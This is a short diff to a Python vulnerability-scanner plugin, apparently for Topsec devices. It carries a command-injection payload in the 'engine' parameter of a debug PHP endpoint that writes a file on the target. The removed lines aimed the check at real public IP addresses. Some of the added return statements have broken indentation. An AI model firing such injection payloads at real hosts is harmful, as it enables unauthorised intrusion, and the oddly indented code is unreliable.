@@ -28,6 +28,7 @@ def audit(arg):
     code, head, res, errcode, _ = curl.curl2(target)
     if 'testvultest' in res:
         security_hole(target)
+        return arg
     #startByteCacheDebug 方法 命令执行
     payload="acc/debug/bytecache_run_action.php?action=2&engine=%20|%20echo%20testvultest3%20>%20a1.php%20|%20&ipfilter=10"
     target = arg + payload
@@ -38,12 +39,10 @@ def audit(arg):
     if 'testvultest3' in res:
         security_hole(target)
 
-        
-    
 
-if __name__ == '__main__':
+
+
+
+        return arg
+if __name__== '__main__':
     from dummy import *
-    # audit(assign('topsec', 'http://61.54.222.33:8080/')[1])
-    audit(assign('topsec', 'http://61.148.24.182/')[1])
-    # audit(assign('topsec', 'http://218.206.217.19:8080/')[1])
-    # audit(assign('topsec', 'http://61.54.222.39:8080/')[1])
